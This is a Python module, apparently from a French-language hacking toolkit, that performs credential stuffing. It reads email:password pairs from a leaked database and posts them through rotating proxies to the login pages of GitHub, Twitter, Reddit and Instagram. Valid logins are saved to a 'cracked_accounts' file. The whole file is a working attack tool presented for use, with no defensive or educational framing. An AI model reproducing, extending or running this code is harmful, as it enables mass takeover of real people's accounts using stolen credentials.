# -*- coding: utf-8 -*-
# Module 13 : credential stuffing
import json, os, time, random
from datetime import datetime
try:
    import requests
except ImportError:
    requests = None

DEFAULT_SITES = {
    "github":   {"url":"https://github.com/session","user_field":"login","pass_field":"password"},
    "twitter":  {"url":"https://twitter.com/sessions","user_field":"session[username_or_email]","pass_field":"session[password]"},
    "reddit":   {"url":"https://www.reddit.com/login","user_field":"user","pass_field":"passwd"},
    "instagram":{"url":"https://www.instagram.com/accounts/login/ajax/","user_field":"username","pass_field":"password"}
}

class AccountCracker:
    def __init__(self, cfg):
        self.cfg = cfg
        self.proxies = []
        if cfg.get("use_proxies") and os.path.exists(cfg.get("proxies_file","")):
            with open(cfg["proxies_file"]) as f:
                self.proxies = [l.strip() for l in f if l.strip()]
        self.found = []

    def load_creds(self):
        out = []
        with open(self.cfg["leaked_db"],encoding="utf-8") as f:
            for line in f:
                if ":" in line:
                    e,p = line.strip().split(":",1)
                    out.append((e,p))
        return out

    def proxy(self):
        if not self.proxies: return None
        p = random.choice(self.proxies)
        return {"http":p,"https":p}

    def try_site(self, site_name, email, password):
        if requests is None: return False
        site = DEFAULT_SITES.get(site_name)
        if not site: return False
        try:
            s = requests.Session()
            r = s.post(site["url"],
                       data={site["user_field"]:email, site["pass_field"]:password},
                       proxies=self.proxy(), timeout=10,
                       headers={"User-Agent":"Mozilla/5.0"})
            return r.status_code == 200 and "invalid" not in r.text.lower()
        except Exception:
            return False

    def run(self):
        creds = self.load_creds()
        sites = self.cfg.get("sites", list(DEFAULT_SITES.keys()))
        total = len(creds) * len(sites)
        print(f"[i] {len(creds)} identifiants x {len(sites)} sites = {total} essais")
        n = 0
        for email,password in creds:
            for site in sites:
                n += 1
                print(f"\r  [{n}/{total}] {site} {email}", end="", flush=True)
                if self.try_site(site, email, password):
                    print()
                    self.found.append({"site":site,"email":email,"password":password})
                    print(f"  [+] VALIDE : {site} {email}:{password}")
                time.sleep(self.cfg.get("delay",0.5))
        print()
        os.makedirs("output", exist_ok=True)
        with open("output/cracked_accounts.txt","a",encoding="utf-8") as f:
            for r in self.found:
                f.write(f"{r['site']} {r['email']}:{r['password']}\n")

def run_interactive():
    from toolkit import ok, err, info, section, ask, confirm
    section("PIRATAGE DE COMPTES")
    with open("config.json") as f: cfg = json.load(f)["account_cracker"]
    if not os.path.exists(cfg["leaked_db"]):
        err(f"Fichier introuvable : {cfg['leaked_db']}"); return
    info(f"Sites ciblés : {list(DEFAULT_SITES.keys())}")
    if not confirm("Lancer le credential stuffing ?"): return
    AccountCracker(cfg).run()
    ok("Résultats : output/cracked_accounts.txt")